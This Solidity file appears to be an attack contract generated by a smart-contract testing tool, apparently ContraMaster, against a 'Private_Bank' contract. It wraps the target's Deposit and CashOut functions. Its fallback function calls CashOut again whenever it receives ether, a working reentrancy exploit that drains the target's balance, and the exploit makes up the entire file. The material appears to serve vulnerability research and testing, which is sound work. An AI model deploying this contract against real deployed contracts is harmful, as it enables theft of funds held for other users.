pragma solidity ^0.4.19;

import "/home/hjwang/Tools/ContraMaster/contracts/Private_Bank.sol";

contract Attack_Private_Bank0 {

  Private_Bank public target_contract;

  function Attack_Private_Bank0(address _targetContract) public payable {
      target_contract = Private_Bank(_targetContract);
  } 

  function vultron_CashOut(uint256 _am) public {
    target_contract.CashOut(_am);
  } 

  function vultron_Deposit(uint256 vultron_amount) public payable{
    target_contract.Deposit.value(vultron_amount)();
  } 

      function() public payable {
        
        target_contract.CashOut(10000);
      }
      } 
